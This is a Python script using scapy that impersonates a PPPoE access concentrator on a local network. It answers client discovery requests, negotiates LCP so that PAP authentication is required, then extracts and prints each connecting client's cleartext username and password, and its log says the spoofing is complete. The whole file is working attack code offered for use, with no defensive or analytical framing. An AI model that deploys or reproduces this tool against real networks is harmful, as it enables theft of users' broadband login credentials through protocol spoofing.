# coding:utf-8

'''
@author Akkuman
@date 2019.5.11
@update 2019.5.12
'''

import struct
import random
import copy
import binascii

from scapy.layers.ppp import *
import scapy.all as scapy

MAC_ADDRESS = "0a:0a:0a:0a:0a:0a"
# 会话 id，可自定义
SESSION_ID = 0x0005


# 获取一个随机的 mac 地址
def get_mac_address():
    maclist = []
    for i in range(6):
        randstr = "".join(random.sample("0123456789abcdef",2))
        maclist.append(randstr)
    return ":".join(maclist)


class PPPoEServer(object):
    filter = "pppoed or pppoes"
    
    def __init__(self):
        self.clientMap = {}
        self.magic_num = b'\x25\x5f\xc5\xcb'

    # 开始监听
    def start(self):
        scapy.sniff(filter=self.filter, prn=self.filterData)

    # 过滤pppoe数据
    def filterData(self, pkt):
        if hasattr(pkt, "type"):
            _type2Method = {
                #发现阶段
                0x8863: {
                    "code": {
                        #PADI
                        0x09: (self.send_pado_packet, "PADI阶段开始,发送PADO..."),
                        #PADR
                        0x19: (self.send_pads_packet, "PADR阶段开始,发送PADS...")
                    }
                },
                #会话阶段
                0x8864:{
                    "proto":{
                        #LCP链路处理
                        0xc021:(self.send_lcp,"----------会话阶段----------"),
                        #PAP协议处理
                        0xc023:(self.get_papinfo,"获取账号信息...")
                    }
                }
            }
            if pkt.type in _type2Method:
                _nMethod = _type2Method[pkt.type]
                for k, v in _nMethod.items():
                    _nVal = getattr(pkt, k)
                    if _nVal in _nMethod[k]:
                        _nObj = _nMethod[k][_nVal]
                        print(_nObj[1])
                        _nObj[0](pkt)


    #处理 PPP LCP 请求
    def send_lcp(self, pkt):
        # 初始化 clientMap
        if not self.clientMap.get(pkt.src):
            self.clientMap[pkt.src] = {"req": 0, "ack": 0}
            
        # 处理 LCP-Configuration-Req 请求
        if bytes(pkt.payload)[8] == 0x01:
            # 第一次 LCP-Configuration-Req 请求返回 Rej 响应包
            if self.clientMap[pkt.src]['req'] == 0:
                self.clientMap[pkt.src]['req'] += 1
                print("第 %d 次收到LCP-Config-Req" % self.clientMap[pkt.src]["req"])
                print("处理Req请求，发送LCP-Config-Rej包")
                self.send_lcp_reject_packet(pkt)
                print("发送LCP-Config-Req包")
                self.send_lcp_req_packet(pkt)
            # 后面的 LCP-Configuration-Req 请求均返回 Ack 响应包
            else:
                self.clientMap[pkt.src]['req'] += 1
                print("第 %d 次收到LCP-Config-Req" % self.clientMap[pkt.src]["req"])
                print("处理Req请求，发送LCP-Config-Ack包")
                self.send_lcp_ack_packet(pkt)
        # 处理 LCP-Configuration-Rej 请求
        elif bytes(pkt.payload)[8] == 0x04:
            print("处理Rej请求，发送LCP-Config-Req包")
            self.send_lcp_req_packet(pkt)

        # 处理 LCP-Configuration-Ack 请求
        elif bytes(pkt.payload)[8] == 0x02:
            self.clientMap[pkt.src]['ack'] += 1
            print("第 %d 收到LCP-Config-Ack" % self.clientMap[pkt.src]["ack"])
        else:
            pass

    # 解析pap账号密码
    def get_papinfo(self, pkt):
        # pap-req
        _payLoad = bytes(pkt.payload)
        if _payLoad[8] == 0x01:
            _nUserLen = int(_payLoad[12])
            _nPassLen = int(_payLoad[13 + _nUserLen])
            _userName = _payLoad[13:13 + _nUserLen]
            _passWord = _payLoad[14 + _nUserLen:14 + _nUserLen + _nPassLen]
            print("get User:%s,Pass:%s" % (_userName, _passWord))
            #self.send_pap_authreject(pkt)
            if pkt.src in self.clientMap:
                del self.clientMap[pkt.src]

            print("欺骗完毕....")


    # 发送pap拒绝验证
    def send_pap_authreject(self, pkt):
        pkt.dst, pkt.src = pkt.src, pkt.dst
        pkt.payload = b'\x03\x02\x00\x06\x01\x00'
        scapy.sendp(pkt)

    # 发送lcp-config-ack回执包
    def send_lcp_ack_packet(self, pkt):
        '''
        PPP Link Control Protocol
            Code: Configuration Ack (0x02)
            Identifier: 1 (0x01)
            Length: 18 (0x0012)
            Options: (14 bytes), Maximum Receive Unit, Authentication Protocol, Magic Number
                Maximum Receive Unit: 1492
                    Type: Maximum Receive Unit (1) (0x01)
                    Length: 4 (0x04)
                    Maximum Receive Unit: 1492 (0x05d4)
                Authentication Protocol: Password Authentication Protocol (0xc023)
                    Type: Authentication Protocol (3) (0x03)
                    Length: 4 (0x04)
                    Authentication Protocol: Password Authentication Protocol (0xc023)
                Magic Number: 0x5e630ab8
                    Type: Magic Number (5) (0x05)
                    Length: 6 (0x06)
                    Magic Number: 0x5e630ab8
        '''
        _payload = bytes(pkt.payload)[:8] + b'\x02' + bytes(pkt.payload)[9:]
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / _payload
        scapy.sendp(_pkt)

    #发送lcp-config-reject回执包
    def send_lcp_reject_packet(self, pkt):
        '''
        PPP Link Control Protocol
            Code: Configuration Reject (4) (0x04)
            Identifier: 1 (0x01)
            Length: 15 (0x000f)
            Options: (11 bytes), Protocol Field Compression, Address and Control Field Compression, Callback, Multilink MRRU
                Protocol Field Compression
                    Type: Protocol Field Compression (7) (0x07)
                    Length: 2 (0x02)
                Address and Control Field Compression
                    Type: Address and Control Field Compression (8) (0x08)
                    Length: 2 (0x02)
                Callback: Location is determined during CBCP negotiation
                    Type: Callback (13) (0x0d)
                    Length: 3 (0x03)
                    Operation: Location is determined during CBCP negotiation (6) (0x06)
                Multilink MRRU: 1614
                    Type: Multilink MRRU (17) (0x11)
                    Length: 4 (0x04)
                    MRRU: 1614 (0x064e)

        '''
        _payload = b'\x04\x01\x00\x0f' + b'\x07\x02\x08\x02\x0d\x03\x06\x11\x04\x06\x4e'
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0xc021) / _payload
        scapy.sendp(_pkt)

    #发送lcp-config-req回执包
    def send_lcp_req_packet(self, pkt):
        '''
        PPP Link Control Protocol
            Code: Configuration Request (1) (0x01)
            Identifier: 1 (0x01)
            Length: 18 (0x12)
            Options: (14 bytes), Maximum Receive Unit, Authentication Protocol, Magic Number
                Maximum Receive Unit: 1492
                    Type: Maximum Receive Unit (1) (0x01)
                    Length: 4 (0x04)
                    Maximum Receive Unit: 1492 (0x05d4)
                Authentication Protocol: Password Authentication Protocol (0xc023)
                    Type: Authentication Protocol (3) (0x03)
                    Length: 4 (0x04)
                    Authentication Protocol: Password Authentication Protocol (0xc023)
                Magic Number: 0xb680bcb6
                    Type: Magic Number (5) (0x05)
                    Length: 6 (0x06)
                    Magic Number: 0xb680bcb6
        '''
        # 服务端声明使用PAP认证
        auth_proto = b'\x01\x04\x05\xd4\x03\x04\xc0\x23\x05\x06\x5e\x63\x0a\xb8'
        _payload = b'\x01\x01\x00\x12' + auth_proto
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0xc021) / _payload
        scapy.sendp(_pkt)
    
    # 发送 lcp-echo-req包
    def send_lcp_echo_request(self, pkt):
        
        _payload = b'\x09\x00\x00\x08' + b'\x25\x5f\xc5\xcb'
        lcp_req = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0xc021) / _payload
        scapy.sendp(lcp_req)
    
    #发送lcp-termination会话终止包
    def send_lcp_end_packet(self, pkt):
        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8863) / PPPoE(version=0x1, type=0x1, code=0xA7, sessionid=0x01, len=0)
        scapy.sendp(_pkt)

    #发送PADS回执包
    def send_pads_packet(self, pkt):
        #寻找客户端的Host_Uniq
        _host_Uniq = self.padi_find_hostuniq(pkt.payload)
        _payload = b'\x01\x01\x00\x00'
        if _host_Uniq:
            _payload += _host_Uniq

        pkt.sessionid =  SESSION_ID
        sendpkt = Ether(src=MAC_ADDRESS, dst=pkt.src, type=0x8863) / PPPoED(version=1, type=1, code=0x65, sessionid=pkt.sessionid, len=len(_payload)) / _payload
        scapy.sendp(sendpkt)


    #发送PADO回执包
    def send_pado_packet(self, pkt):
        # 寻找客户端的Host_Uniq
        _host_Uniq = self.padi_find_hostuniq(pkt.payload)
        _payload = b'\x01\x02\x00\x07akkuman\x01\x01\x00\x00'
        if _host_Uniq:
            _payload += _host_Uniq
        # PADO 回执包的 sessoinid 为 0x0000
        pkt.sessionid =  getattr(pkt, 'sessionid', 0x0000)
        sendpkt = Ether(src=MAC_ADDRESS, dst=pkt.src, type=0x8863) / PPPoED(version=1, type=1, code=0x07, sessionid=pkt.sessionid, len=len(_payload)) / _payload
        scapy.sendp(sendpkt)


    #寻找客户端发送的Host-Uniq
    def padi_find_hostuniq(self, payload):
        _key = b'\x01\x03'
        payload = bytes(payload)
        if _key in payload:
            _nIdx = payload.index(_key)
            _nLen = struct.unpack("!H", payload[_nIdx + 2:_nIdx + 4])[0]
            _nData = payload[_nIdx + 2:_nIdx + 4 + _nLen]
            return _key + _nData
        return


if __name__ == "__main__":
    MAC_ADDRESS = get_mac_address()
    n = PPPoEServer()
    n.start()
